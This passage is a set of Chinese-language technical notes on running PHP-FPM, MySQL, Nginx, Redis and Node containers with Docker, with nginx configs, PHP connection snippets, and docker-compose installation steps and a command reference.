-p 9000:9000 :将容器的9000端口映射到主机的9000端口
--name myphp-fpm :将容器命名为myphp-fpm
-v ~/nginx/www:/www :将主机中项目的目录www挂载到容器的/www
-v $PWD/conf:/usr/local/etc/php :将主机中当前目录下的conf目录挂载到容器的/usr/local/etc/php
-v $PWD/logs:/phplogs :将主机中当前目录下的logs目录挂载到容器的/phplogs

$ docker run -d -p 8080:8080 --link mysql_server:mysql_server -v ~/app:/app -w /app php:7.2.5-fpm php -S 0.0.0.0:8080 -t /app
命令解释
# -d 后台默认启动
# -p 映射端口8080映射到本机8080,使用方式 本地端口:容器端口
# -v 挂在目录~/app挂载到容器里面/app目录
# -w 工作目录/app目录,相当于cd
# --link 连接容器,容器名:内部使用的名字
# php:7.2.5-fpm 镜像名
# php -S 0.0.0.0:8080 -t /app

$ vi ~/app/index.php
phpinfo();
打开127.0.0.1:8080即可看到phpinfo

# php -r "phpinfo();" | grep php.ini

【 php官方镜像 】
$ docker run -it --name testphp php   # 进入php镜像容器的php -a交互模式,exit退出容器
$ docker start testphp                # 重新启动容器
$ docker exec -it testphp             # 进入容器操作
# apt install procps                  # 安装ps命令
# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  3.4 186396 17232 pts/0    Ss+  01:02   0:00 php -a
root         5  0.0  0.6  18140  3116 pts/1    Ss   01:03   0:00 bash
root       456  0.0  0.5  36640  2804 pts/1    R+   01:31   0:00 ps aux
# ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 01:02 pts/0    00:00:00 php -a
root         5     0  0 01:03 pts/1    00:00:00 bash
root       457     5  0 01:31 pts/1    00:00:00 ps -ef

【 2种方式安装拓展 】
The php image the helper scripts docker-php-ext-configure, docker-php-ext-install, and docker-php-ext-enable to more easily install PHP extensions

1.进入容器里面安装扩展
$ docker exec -i -t naughty_fermi /bin/bash
$ docker-                           # 按两下tab可以看到系统的提示
$ docker-php-ext-install sockets    # 安装扩展
$ php -m                            # 就能够看到sockets库
$ ctrl+p  再crtl + q                # 退出容器的方法有点特殊,需要ctrl+p  再crtl + q 这样才能在后台继续挂起
$ ps -ef | grep php                 # 找到php cli-server pid为11840,docker里面的这些进程是在本机里面能够看到的
$ kill -9 11840                     # 杀死了进程php也会自动关闭
$ docker start naughty_fermi        # 重新开启容器,每次新增扩展都需要重新启动一下

在安装一些扩展是需要一些依赖的
php代码里面连接,mysql host就不能用127.0.0.1或localhost了,把链接换为mysql_server mysql的容器名字。

2.外部安装拓展,opcache为例
$ docker exec -d naughty_fermi docker-php-ext-install opcache

</pre>

<h4>redis</h4><pre>
docker run --name redis -p 6379:6379 -d redis:latest

php添加redis扩展
源码安装方式
php7 can install

~$ cat Dockerfile
FROM php:7.2.5-fpm
RUN docker-php-ext-install pdo_mysql
ENV PHPREDIS_VERSION 3.1.3
RUN curl -L -o /tmp/redis.tar.gz https://github.com/phpredis/phpredis/archive/$PHPREDIS_VERSION.tar.gz \
    && tar xzf /tmp/redis.tar.gz \
    && rm -rf /tmp/redis.tar.gz \
    && mkdir -p /usr/src/php/ext \
    && mv phpredis-$PHPREDIS_VERSION /usr/src/php/ext/redis \
    && docker-php-ext-install redis \
    && rm -rf /usr/src/php              # 如果这段不加构建的镜像将大100M

~$ docker build -t php:7.2.5-fpm-mysql-redis

</pre>

<h4>node</h4><pre>
$ docker run --name node1 -v ~/nodeweb:/home/app -d node node /home/app/index.js
$ docker inspect -f '{{ .NetworkSettings.IPAddress }}' node1
$ curl 172.17.0.2:8888

Docker Compose:
version: "1"
services:
  node:
    image: "node"
    user: "node"
    working_dir: /home/node/app
    environment:
      - NODE_ENV=production
    volumes:
      - ~/nodeweb:/home/node/app
    expose:
      - "8888"
    command: "node index.js"

You can then run using Docker Compose:
$ docker-compose up -d

$ cat docker-compose.yml
version: "2"
services:
  node:
    image: "node:8"
    user: "node"
    working_dir: /home/node/app
    environment:
      - NODE_ENV=production
    volumes:
      - ./:/home/node/app
    expose:
      - "8081"
    command: "npm start"

$ docker-compose up -d

</pre>
</div>

<div id="docker_example">
<h3>docker实例</h3><textarea>berlin75@ubuntu1804:~$ docker run --name nginx -d nginx
berlin75@ubuntu1804:~$ docker run --name nginx_p -p 80:80 -d nginx
berlin75@ubuntu1804:~$ docker run --name mysql -d -e MYSQL_ROOT_PASSWORD=123456 mysql
berlin75@ubuntu1804:~$ docker ps
CONTAINER ID  IMAGE  COMMAND                  CREATED          STATUS         PORTS                NAMES
a25729de9ff2  mysql  "docker-entrypoint.s…"   7 seconds ago    Up 5 seconds   3306/tcp             mysql
702b4aa26ce8  nginx  "nginx -g 'daemon of…"   5 seconds ago    Up 4 seconds   80/tcp               nginx
0e5147dff578  nginx  "nginx -g 'daemon of…"   20 minutes ago   Up 20 minutes  0.0.0.0:80->80/tcp   nginx_p
berlin75@ubuntu1804:~$ docker exec -it nginx bash
root@702b4aa26ce8:/# echo nginx > /usr/share/nginx/html/index.html
berlin75@ubuntu1804:~$ docker exec -it nginx_p bash
root@0e5147dff578:/# echo nginx_p > /usr/share/nginx/html/index.html
berlin75@ubuntu1804:~$ docker inspect -f '{{ .NetworkSettings.IPAddress }}' nginx_p
172.17.0.3
berlin75@ubuntu1804:~$ docker inspect -f '{{ .NetworkSettings.IPAddress }}' nginx
172.17.0.2
berlin75@ubuntu1804:~$ curl 127.0.0.1:80  # nginx容器没有映射
nginx_p
berlin75@ubuntu1804:~$ curl 172.17.0.2
nginx
berlin75@ubuntu1804:~$ curl 172.17.0.3
nginx_p
berlin75@ubuntu1804:~$ docker inspect -f '{{ .NetworkSettings.IPAddress }}' mysql
172.17.0.4
berlin75@ubuntu1804:~$ mysql -h172.17.0.4 -uroot -p
berlin75@ubuntu1804:~$ docker exec -it mysql bash
root@a25729de9ff2:/# mysql -uroot -p
mysql> ALTER USER 'root'@'%' IDENTIFIED WITH mysql_native_password BY '123456';
mysql> FLUSH PRIVILEGES;
mysql> quit
root@a25729de9ff2:/# exit
berlin75@ubuntu1804:~$ mysql -h172.17.0.4 -uroot -p
mysql>quit

berlin75@ubuntu1804:~$ docker run --name php -d -p 8080:8080 --link mysql:mysql -v ~/app:/app -w /app php:7.2.5-fpm php -S 0.0.0.0:8080 -t /app
berlin75@ubuntu1804:~$ docker ps
CONTAINER ID IMAGE COMMAND                 CREATED      STATUS     PORTS                              NAMES
f8bd80e0c6b2 php:7.2.5-fpm "docker-php-entrypoi…" 33 seconds ago Up 28 seconds 0.0.0.0:8080->8080/tcp, 9000/tcp   php
a25729de9ff2 mysql "docker-entrypoint.s…"  5 hours ago  Up 5 hours 3306/tcp                           mysql
702b4aa26ce8 nginx "nginx -g 'daemon of…"  5 hours ago  Up 5 hours 80/tcp                             nginx
0e5147dff578 nginx "nginx -g 'daemon of…"  6 hours ago  Up 6 hours 0.0.0.0:80->80/tcp                 nginx_p

berlin75@ubuntu1804:~$ cat ~/app/index.php
<?php
#echo phpinfo();
echo "hello php docker\n";
echo "connect to mysql docker\n";

$dsn="mysql:host=172.17.0.4;dbname=mysql";
try{
  $pdo=new PDO($dsn,"root","123456");
}catch(PDOException $e){
  die('failed to connect to mysql:'.$e->getMessage();
}
echo "connected\n";

$ docker exec -it f8 bash
root@f8bd80e0c6b2:/app# php index.php
hello php docker
connect to mysql docker
failed to connect to mysql:could not find driver
root@f8bd80e0c6b2:/app# docker-php-
docker-php-entrypoint     docker-php-ext-enable     docker-php-source
docker-php-ext-configure  docker-php-ext-install
root@f8bd80e0c6b2:/app# docker-php-ext-install --help
root@f8bd80e0c6b2:/app# php -m
root@f8bd80e0c6b2:/app# docker-php-ext-install pdo_mysql
root@f8bd80e0c6b2:/app# php index.php
hello php docker
connect to mysql docker
connected
root@f8bd80e0c6b2:/app# ping mysql
PING mysql(172.17.0.4): 56 data bytes
64 bytes from 172.17.0.4: icmp_seq=0 ttl=64 time=0.163 ms
64 bytes from 172.17.0.4: icmp_seq=1 ttl=64 time=0.144 ms

</textarea>

<h3>用Docker来运行和调试PHP网站</h3><pre>
用Docker可以快速搭建统一的PHP开发和生产环境,开发环境就是生产环境,本地测试通过代表着部署到服务器也可以完全正常运行,而且还可以部署多个测试环境,让一套代码同时跑在PHP多个版本的系统上测试兼容性,而不需要把本地开发环境弄得一塌糊涂

架设的步骤如下
架设MySQL数据库,因为PHP需要连接到MySQL
架设PHP服务器,同时连接到MySQL Server
架设Nginx服务器,连接PHP服务器
因为PHP访问数据库,所以Nginx是不需要连接MySQL的,Nginx只需要做代理服务器,当有PHP请求的时候转发给PHP服务器处理就好了。

这里的架设范例都是基于单个主机进行的,实例之间会自动存在于一个虚拟的docker0的交换机内,所以实例之间就好像在同一个局域网一样,如果要跨主机进行数据的访问,那么可能需要暴露部分服务的端口,比如MySQL的3306端口,PHP的9000端口等

基本环境架设
1、准备mysql数据存储
因为要经常升级MySQL到最新版本,不想每升级一次数据库就重新导出、导入一次数据,在创建MySQL实例之前需要先创建一个Volume用于保存MySQL的数据。可以用busybox作为base image,创建一个包含/var/lib/mysql的volume以便后续挂载到MySQL实例上。

~/app$ docker run --name=mysql_data -v /var/lib/mysql -d busybox echo mysql data

运行docker ps -a可以看到创建的mysql_data实例
CONTAINER ID  IMAGE          COMMAND            CREATED       STATUS                    PORTS  NAMES
ee138116e544  busybox:latest "echo MySQL Data"  6 seconds ago Exited(0) 5 seconds ago         mysql_data

2、创建MySQL实例

~/app$ docker run --name mysql_server --volumes-from mysql_data -e MYSQL_ROOT_PASSWORD=123456 -d mysql
--volumes-from命令表示挂载名为mysql_data的volume到即将创建的mysql_server实例,即在mysql_server实例中对/var/lib/mysql目录进行读写操作时实际的文件是存储在mysql_data实例中的,即MySQL的数据都保存在mysql_data实例中
-e MYSQL_ROOT_PASSWORD参数用于设置环境变量,实例初始化的时候会用这个环境变量来设置root用户的密码,如果是开发或者测试环境也可以使用-e MYSQL_ALLOW_EMPTY_PASSWORD=1参数设置root密码为空

查看一下刚刚创建的MySQL实例
docker ps -a
CONTAINER ID IMAGE                 COMMAND              CREATED        STATUS         PORTS      NAMES
f0253a67d154 tommylau/mysql:latest "/entrypoint.sh mysq 9 seconds ago  Up 8 seconds   3306/tcp   mysql_server
ee138116e544 busybox:latest        "echo MySQL Data"    33 seconds ago Exited(0) 33 seconds ago mysql_data

3、创建wwwroot存储
这步是可选的,如果只运行很简单的站点的话直接使用Docker自带的-v将本地路径映射到实例里面,比如:
docker run -v /path/to/web:/var/www/html -p 80:80 -d tommylau/apache
这样访问http://localhost的时候,访问的就是本地磁盘的/path/to/web。

但本地保存的文件位置可能会有变化,为了以后更好地维护和管理新建一个wwwroot的实例,用于映射实例里面的/var/www/html路径,因为Nginx和PHP需要同时访问到这些文件。

~/app$ docker run --name wwwroot -v ~/app/www:/var/www/html -d busybox echo wwwroot

可以再次运行docker ps -a检查一下:
CONTAINER ID  IMAGE                 COMMAND              CREATED       STATUS            PORTS    NAMES
98b7d5a39152  busybox:latest        "echo wwwroot"       3 minutes ago Exited(0) 3 minutes ago   wwwroot
f0253a67d154  tommylau/mysql:latest "/entrypoint.sh mysq 5 minutes ago Up 5 minutes      3306/tcp mysql_server
ee138116e544  busybox:latest        "echo MySQL Data"    5 minutes ago Exited(0) 5 minutes ago   mysql_data

4、运行PHP-FPM
现在就要用到之前所创建的mysql_server实例和wwwroot存储了

~/app$ docker run --name php_fpm --volumes-from wwwroot --link mysql_server:mysql -d php:7.2.5-fpm

--volumes-from参数,这样在新建的php_fpm实例里面访问/var/www/html就会引用wwwroot实例,又因为wwwroot实例映射到了~/app/www,所以实际访问地址是本机的~/app/www

--link参数表示连接另外一个实例,这里连接了之前创建的mysql_server实例,并将它命名为mysql。这里所谓的命名可以理解为一个主机名或别名,在新创建的这个php_fpm实例中,如果打开/etc/hosts会发现里面有一条域名记录,指向mysql_server实例。

$ docker ps
CONTAINER ID IMAGE                 COMMAND               CREATED            STATUS        PORTS    NAMES
775b56aa5f5e tommylau/php:latest   "php-fpm"             About a minute ago Up 16 minutes 9000/tcp php-fpm
f0253a67d154 tommylau/mysql:latest "/entrypoint.sh mysq  16 minutes ago     Up 16 minutes 3306/tcp mysql_server

$ docker exec -it php-fpm cat /etc/hosts
172.17.0.5  775b56aa5f5e
127.0.0.1 localhost
::1 localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.3  mysql

使用了docker ps命令没有-a,表示只列出正在运行的实例。
创建的mysql_data和wwwroot都是完全不需要占用CPU的,它们只是负责存储而已。

可以看到在hosts文件最后有一条记录172.17.0.3 mysql,这个就是mysql_server实例在虚拟环境中的IP地址,在php_fpm实例中就是通过mysql这个名字与mysql_server实例进行通信的,可以 ping 一下看看。

$ docker exec -it php_fpm ping -c 3 mysql
PING mysql(172.17.0.3): 56 data bytes
64 bytes from 172.17.0.3: icmp_seq=0 ttl=64 time=0.066 ms
64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.093 ms
64 bytes from 172.17.0.3: icmp_seq=2 ttl=64 time=0.142 ms
--- mysql ping statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.066/0.100/0.142/0.031 ms

5、运行Nginx

Nginx配置文件default.conf
创建~/app/conf.d/default.conf
server {
  listen 80;
  server_name localhost;   # 需要根据实际情况进行调整,如果只运行一个默认网站的话,可以不用修改

  root /var/www/html;      # 需要根据实际情况调整,如果都是按照这个教程操作的话,可以不用修改
  index index.html index.htm index.php;

  location / {
    # First attempt to serve request as file, then
    # as directory, then fall back to displaying a 404.
    try_files $uri $uri/ =404;
    # Uncomment to enable naxsi on this location
    # include /etc/nginx/naxsi.rules
  }

  location ~ \.php$ {
    fastcgi_pass php:9000;     # 后面的php是要连接的实例名称,稍后在命令行中会用到,先配置好
    fastcgi_index index.php;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    include fastcgi_params;
  }
}

创建Web页面
在本地~/app/www目录创建文件index.html和phpinfo.php

运行Nginx可以使用Dockerfile生成一个新的镜像,也可以使用-v挂在一个配置文件映射到实例中。

1、Dockerfile方式运行Nginx
在刚才创建default.conf的目录内(~/app/conf.d),创建一个文件名为Dockerfile的文件,其内容如下:

Dockerfile
FROM nginx
COPY default.conf /etc/nginx/conf.d/

打开终端或命令行并进入到Dockerfile所在目录,运行Docker build命令来生成一个新的镜像。本命令必须在Dockerfile和default.conf所在目录执行,否则Docker会提示找不到Dockerfile。

$ docker build -t local/nginx .
Sending build context to Docker daemon 3.072 kB
Sending build context to Docker daemon
Step 0 : FROM nginx
 ---> ee8df13c0397
Step 1 : COPY default.conf /etc/nginx/conf.d/
 ---> 05e151de7cef
Removing intermediate container 41eefaf73780
Successfully built 05e151de7cef

$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             VIRTUAL SIZE
local/nginx         latest              05e151de7cef        27 seconds ago      92.66 MB

这个命令会生成一个新的名为local/nginx的镜像,当然也可以按照自己的喜好给它重新起个名字,稍后还要召唤它来提供Web服务。

最后整合之前启动的PHP-FPM实例php_fpm
docker run --name=nginx --volumes-from wwwroot --link php_fpm:php -p 80:80 -d local/nginx

同样需要加载wwwroot实例,以便实例可以正确的访问/var/www/html目录。
这里将实例php-fpm映射成别名php,这里必须要与之前修改的Nginx配置文件default.conf中的名字相匹配(fastcgi_pass后面的服务器名)。-p 80:80表示将实例内的80端口暴露给Host主机。

这个时候已经可以通过http://localhost来访问Nginx实例了,也可以访问 http://localhost/phpinfo.php来查看PHP版本信息。

使用boot2docker的用户需要将localhost修改为Guest的IP地址。如果VirtualBox只有boot2docker一个虚拟机的话则boot2docker默认的IP地址是:192.168.59.103。所以可以尝试一下访问:http://192.168.59.103 。如果不行的话可以运行boot2docker ip来获得guest的IP地址。
$ boot2docker ip
192.168.59.103

2、挂载方式运行Nginx
挂载配置文件方式启动Nginx跟使用Dockerfile方式类似,不过更简单一点,这种方式比较适合配置简单的情况。
之前保存default.conf的路径是~/app/conf.d/default.conf。实现同上述同样的启动效果可以使用下面的命令。

docker run --name=nginx --volumes-from wwwroot --link php_fpm:php -v ~/app/conf.d/default.conf:/etc/nginx/conf.d/default.conf -p 80:80 -d tommylau/nginx

打开网页检查一下是和使用Dockerfile的方式一样

还有一种情况是有多个配置文件,如果一一指定的话会变得相当的痛苦,这个时候就会使用目录映射的方式来替代文件映射。
先来创建一个包含配置的文件夹conf.d并把default.conf移动到该目录中。
$ cd ~/app
$ mkdir conf.d
$ mv default.conf conf.d

然后使用如下命令就可以把整个配置文件的目录映射到实例中。
docker run --name=nginx --volumes-from wwwroot --link php_fpm:php -v ~/app/conf.d:/etc/nginx/conf.d -p 80:80 -d nginx
再打开浏览器检查一下,依然可以正常运行。

6、测试MySQL连接
在wwwroot目录~/app/www中新建一个mysql.php的文件:
$connect = mysql_connect("mysql", "root", "123456") or die("Unable to connect to MySQL.");
mysql_select_db("mysql") or die("Could not open the database.");
$showtablequery = "SHOW TABLES FROM mysql;";
$query_result = mysql_query($showtablequery);
while($row = mysql_fetch_array($query_result) {
    echo $row[0] . "<br />\n";
}

访问:http://localhost/mysql.php

</pre><textarea>berlin75@ubuntu1804:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
nginx               latest              3c5a05123222        9 days ago          109MB
php                 latest              99ff828847e0        9 days ago          367MB
mysql               5.7                 66bc0f66b7af        2 weeks ago         372MB
mysql               latest              8d99edb9fd40        2 weeks ago         445MB
ubuntu              latest              113a43faa138        5 weeks ago         81.2MB
busybox             latest              8c811b4aec35        7 weeks ago         1.15MB
php                 7.2.5-fpm           e6970efc6d34        2 months ago        367MB
~$ mkdir -p app/www
~/app$ sudo vi www/index.html
~/app$ sudo vi www/phpinfo.php
~/app$ mkdir conf.d
~/app$ sudo vi conf.d/default.conf
~/app$ docker run --name=mysql_data -v /var/lib/mysql -d busybox echo mysql data
~/app$ docker run --name mysql_server --volumes-from mysql_data -e MYSQL_ROOT_PASSWORD=123456 -d mysql
~/app$ docker run --name wwwroot -v ~/app/www:/var/www/html -d busybox echo wwwroot
~/app$ docker run --name php_fpm --volumes-from wwwroot --link mysql_server:mysql -d php:7.2.5-fpm
~/app$ docker run --name nginx -v ~/app/conf.d:/etc/nginx/conf.d --volumes-from wwwroot --link php_fpm:php -p 80:80 -d nginx  # 根据Dockerfile开了两个数据卷,方便写配置以及部署应用
~/app$ docker container ls -a
CONTAINER ID IMAGE   COMMAND                CREATED        STATUS               PORTS              NAMES
1639d9b84a7b nginx   "nginx -g 'daemon of…" 17 seconds ago Up 10 seconds        0.0.0.0:80->80/tcp nginx
4b28a7fb0c26 php:7.2."docker-php-entrypoi…" 12 minutes ago Up 12 minutes        9000/tcp           php_fpm
7b858176d6a9 busybox "echo wwwroot"         14 minutes ago Exited(0) 13 minutes ago               wwwroot
7d7fd27ef098 mysql   "docker-entrypoint.s…" 15 minutes ago Up 15 minutes        3306/tcp           mysql_server
a5b21afc7ac1 busybox "echo mysql data"      17 minutes ago Exited(0) 17 minutes ago               mysql_data

~/app/www$ docker exec -it php_fpm bash
root@4b28a7fb0c26:/var/www/html# php -m
root@4b28a7fb0c26:/var/www/html# docker-php-
root@4b28a7fb0c26:/var/www/html# docker-php-ext-install pdo_mysql
root@4b28a7fb0c26:/var/www/html# exit
~/app/www$ docker restart php_fpm
~/app/www$ docker exec -it mysql_server bash
root@7d7fd27ef098:/# mysql -uroot -p
mysql> select version();     //  8.0.11
mysql> ALTER USER 'root'@'%' IDENTIFIED WITH mysql_native_password BY '123456';
mysql> FLUSH PRIVILEGES;


</textarea>

<h4>docker安装php,nginx,redis,mysql容器并且link起来</h4><pre>
docker run --name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=root -d mysql:5.6
docker run --name redis -p 6379:6379 -d redis
docker run --name php -v ~/app/www:/var/www/html -d php:7.2.5-fpm-mysql-redis

nginx ,php-fpm ,mysql,redis容器内链接
docker run --name lnmp --link mysql:mysql --link redis:redis --link php:php -p 80:80 -v ~/app/www/:/var/www/html -v ~/app/conf.d:/etc/nginx/conf.d -d nginx

编辑nginx配置文件
docker将容器中的/etc/nginx/conf.d/default.conf的配置文件cp到本地
docker cp nginx:/etc/nginx/conf.d/default.conf default.conf

server {
  listen       80;
  server_name  localhost;

  access_log  /var/log/nginx/access.log  main;

  location / {
      root   /www;          #容器目录
      index  index.html index.htm index index.php;
  }
  autoindex on;
  autoindex_exact_size off;
  autoindex_localtime on;
  #error_page  404              /404.html;

  # redirect server error pages to the static page /50x.html
  error_page   500 502 503 504  /50x.html;
  location = /50x.html {
      root   /usr/share/nginx/html;
  }

  # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
  location ~ \.php$ {
      #root           html;
      fastcgi_pass   172.17.0.2:9000;    #php-fpm容器的ip,端口9000
      fastcgi_index  index.php;
      fastcgi_param  SCRIPT_FILENAME  /www/$fastcgi_script_name;
      include        fastcgi_params;
  }

  # deny access to .htaccess files, if Apache's document root
  # concurs with nginx's one
  #location ~ /\.ht {
  #    deny  all;
  #}
}

使用redis
要想使用redis那就必须在php容器中安装redis扩展
redis扩展下载连接
phpize
./configure
make && make install
这个时候编译安装完毕,然后会生成一个redis.so的扩展,其配置文件直接扔到/usr/local/etc/php/conf.d下面

redis.ini文件名字
extension=/usr/local/lib/php/extensions/no-debug-non-zts-20170718/redis.so

重启php-fpm容器
docker restart php

localhost:8888/index.php
echo phpinfo();
会发现redis扩展已经装好

redis使用
$redis = new Redis();
$redis->connect('172.17.0.2',6379); //容器ip
// print_r($redis);die;
$strname = 'push';
$re = $redis->publish($strname,"来自小编自己写的  {$strname}推送！");
echo "-----{$strname}----推送成功<br />";
$redis->close();

mysql使用
try {
    $db = new PDO('mysql:host=172.17.0.3;dbname=test','root', 'root');
    $arr = $db->query("select * from user")->fetch();
    var_dump($arr);die;
} catch(PDOException $e) {
    print "Error: " . $e->getMessage() . "<br/>";
    die();
}

</pre>

<h4>为复杂的容器环境配置Nginx反向代理</h4><pre>
场景:现有几台服务器,各部署有十几到数十个Docker容器,容器相互之间独立没有关联,每个容器各自暴露一个到几十个端口不等,而且部分容器端口是随机的。

任务:把全部容器绑定到一个域名之下。

第一步:拉取nginx,这里用的是tutum公司的镜像,这个公司的镜像质量都很高。
docker pull tutum/nginx

第二步:根据Dockerfile开了两个数据卷,方便写配置及部署应用。
docker run -d -p 80:80 -v /**path**/app/:/app/ -v /**path**/nginx/sites-enabled:/etc/nginx/sites-enabled tutum/nginx

第三步:编辑/**path**/nginx/sites-enabled/default文件如下:
server {
  listen 80;
  server_name lab.example.com; # 这里填自定义域名
  location / {
    proxy_redirect off;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_pass http://172.17.0.3:8181; # 这里填容器地址,如果不知道填写公网IP也是可以的。
  }
}

</pre>
</div>

<div id="docker_compose">
<h3>docker compose</h3><pre>
Compose项目是Docker官方的开源项目,负责实现对Docker容器集群的快速编排
docker-compose是用来做docker的多容器控制,把docker自动化,有了docker-compose可以把所有繁复的docker操作全都一条命令自动化的完成
Compose定位是定义和运行多个Docker容器的应用(Defining and running multi-container Docker applications),其前身是开源项目Fig

使用一个Dockerfile模板文件可以让用户很方便的定义一个单独的应用容器,然而在日常工作中经常会碰到需要多个容器相互配合来完成某项任务的情况。例如要实现一个Web项目,除Web服务容器本身,往往还需要再加上后端的数据库服务容器,甚至还包括负载均衡容器等。
Compose恰好满足了这样的需求,它允许用户通过一个单独的docker-compose.yml模板文件(YAML格式)来定义一组相关联的应用容器为一个项目(project)。

Compose中有两个重要的概念:
服务(service):一个应用的容器,实际上可以包括若干运行相同镜像的容器实例。
项目(project):由一组关联的应用容器组成的一个完整业务单元,在docker-compose.yml文件中定义。
Compose的默认管理对象是项目,通过子命令对项目中的一组容器进行便捷地生命周期管理。

Compose项目由Python编写,实现上调用了Docker服务提供的API来对容器进行管理,因此只要所操作的平台支持Docker API就可以在其上利用Compose来进行编排管理

使用Compose基本会有如下三步流程:
1、在Dockfile中定义应用环境,使其可以在任何地方复制。
2、在docker-compose.yml中定义组成应用程序的服务,以便它们可以在隔离的环境中一起运行。
3、最后运行dcoker-compose up,Compose将启动并运行整个应用程序

</pre>

<h4>docker-compose安装</h4><pre>
Compose可以通过Python的包管理工具pip进行安装,也可以直接下载编译好的二进制文件使用,甚至能够直接在Docker容器中运行

二进制包
在Linux上的安装从官方GitHub Release处直接下载编译好的二进制文件即可
$ mkdir ~/wordpress && cd wordpress
$ sudo -i
$ sudo curl -L https://github.com/docker/compose/releases/download/1.17.1/docker-compose-`uname -s`-`uname -m` > /usr/local/bin/docker-compose
$ sudo chmod +x /usr/local/bin/docker-compose
$ docker-compose --version
$ docker-compose up -d

bash补全命令
$ curl -L https://raw.githubusercontent.com/docker/compose/1.8.0/contrib/completion/bash/docker-compose > /etc/bash_completion.d/docker-compose

容器中执行
Compose既然是一个Python应用,自然也可以直接用容器来执行,它其实是下载了docker/compose镜像并运行
$ curl -L https://github.com/docker/compose/releases/download/1.8.0/run.sh > /usr/local/bin/docker-compose
$ chmod +x /usr/local/bin/docker-compose

pip安装
apt install python-pip
pip install docker-compose

卸载
如果是二进制包方式安装的删除二进制文件即可。
$ sudo rm /usr/local/bin/docker-compose
如果是通过pip安装的则执行如下命令即可删除。
$ sudo pip uninstall docker-compose

</pre>

<h4>compose命令</h4><pre>
Compose大部分命令的对象既可以是项目本身,也可以指定为项目中的服务或容器。如果没有特别的说明命令对象将是项目,这意味着项目中所有的服务都会受到命令影响。

docker-compose命令的基本的使用格式是
docker-compose [-f=< arg >...] [options] [COMMAND] [ARGS...]

命令选项
-f, --file FILE           指定使用的Compose模板文件,默认为docker-compose.yml,可以多次指定
-p, --project-name NAME   指定项目名称,默认将使用所在目录名称作为项目名
--x-networking            使用Docker的可拔插网络后端特性
--x-network-driver DRIVER 指定网络后端的驱动,默认为bridge
--verbose                 输出更多调试信息
-v, --version             打印版本并退出

docker-compose [COMMAND] --help或docker-compose help [COMMAND]可以查看具体某个命令的使用格式。
docker-compose version  # 打印版本信息

【 build 】
docker-compose build [options] [SERVICE...]
构建或重新构建项目中的服务容器。
服务容器一旦构建后将会带上一个标记名,例如对于web项目中的一个db容器,可能是web_db

可以随时在项目目录下运行docker-compose build来重新构建服务。

选项包括:
--force-rm 删除构建过程中的临时容器。
--no-cache 构建镜像过程中不使用 cache(这将加长构建过程)。
--pull     始终尝试通过 pull 来获取更新版本的镜像。

【 config 】
验证Compose文件格式是否正确,若正确则显示配置,若格式错误显示错误原因。

【 down 】
此命令将会停止 up 命令所启动的容器,并移除网络

【 exec 】
进入指定的容器。

【 images 】
列出Compose文件中包含的镜像。

【 kill 】
docker-compose kill [options] [SERVICE...]。
通过发送SIGKILL信号来强制停止服务容器。
支持通过-s参数来指定发送的信号,例如通过如下指令发送SIGINT信号。
$ docker-compose kill -s SIGINT

【 logs 】
docker-compose logs [options] [SERVICE...]。
查看服务容器的输出,默认docker-compose将对不同的服务输出使用不同的颜色来区分。可以通过--no-color来关闭颜色。该命令在调试问题的时候十分有用。

【 pause 】
docker-compose pause [SERVICE...]。
暂停一个服务容器。

【 port 】
docker-compose port [options] SERVICE PRIVATE_PORT。
打印某个容器端口所映射的公共端口。

选项:
--protocol=proto 指定端口协议,tcp(默认值)或者 udp。
--index=index 如果同一服务存在多个容器,指定命令对象容器的序号(默认为 1)。

【 ps 】
docker-compose ps [options] [SERVICE...]。
列出项目中目前的所有容器。

选项:
-q 只打印容器的ID信息。

【 pull 】
docker-compose pull [options] [SERVICE...]。
拉取服务依赖的镜像。

选项:
--ignore-pull-failures 忽略拉取镜像过程中的错误。

【 push 】
推送服务依赖的镜像到Docker镜像仓库。

【 restart 】
docker-compose restart [options] [SERVICE...]。
重启项目中的服务。

选项:
-t, --timeout TIMEOUT 指定重启前停止容器的超时(默认为 10 秒)。

【 rm 】
docker-compose rm [options] [SERVICE...]。
删除所有(停止状态的)服务容器。推荐先执行docker-compose stop命令来停止容器。

选项:
-f, --force 强制直接删除,包括非停止状态的容器。一般尽量不要使用该选项。
-v 删除容器所挂载的数据卷。

【 run 】
docker-compose run [options] [-p PORT...] [-e KEY=VAL...] SERVICE [COMMAND] [ARGS...]。
在指定服务上执行一个命令。
$ docker-compose run ubuntu ping docker.com  # 启动一个ubuntu服务容器,并执行ping docker.com命令

默认如果存在关联则所有关联的服务将会自动被启动,除非这些服务已经在运行中
该命令类似启动容器后运行指定的命令,相关卷、链接等都将会按照配置自动创建
两个不同点:
给定命令将会覆盖原有的自动运行命令;
不会自动创建端口,以避免冲突

如果不希望自动启动关联的容器,可以使用 --no-deps 选项
$ docker-compose run --no-deps web python manage.py shell  # 不启动web容器所关联的其它容器。

选项:
-d 后台运行容器
--name NAME 为容器指定一个名字
--entrypoint CMD 覆盖默认的容器启动指令
-e KEY=VAL 设置环境变量值,可多次使用选项来设置多个环境变量
-u, --user="" 指定运行容器的用户名或者 uid
--no-deps 不自动启动关联的服务容器
--rm 运行命令后自动删除容器,d 模式下将忽略
-p, --publish=[] 映射容器端口到本地主机
--service-ports 配置服务端口并映射到本地主机
-T 不分配伪 tty,意味着依赖 tty 的指令将无法运行

【 scale 】
docker-compose scale [options] [SERVICE=NUM...]
设置指定服务运行的容器个数。通过service=num的参数来设置数量,一般当指定数目多于该服务当前实际运行容器,将新创建并启动容器;反之将停止容器
$ docker-compose scale web=3 db=2  # 启动3个容器运行web服务2个容器运行db服务

选项:
-t, --timeout TIMEOUT 停止容器时候的超时(默认为 10 秒)

【 start 】
docker-compose start [SERVICE...]
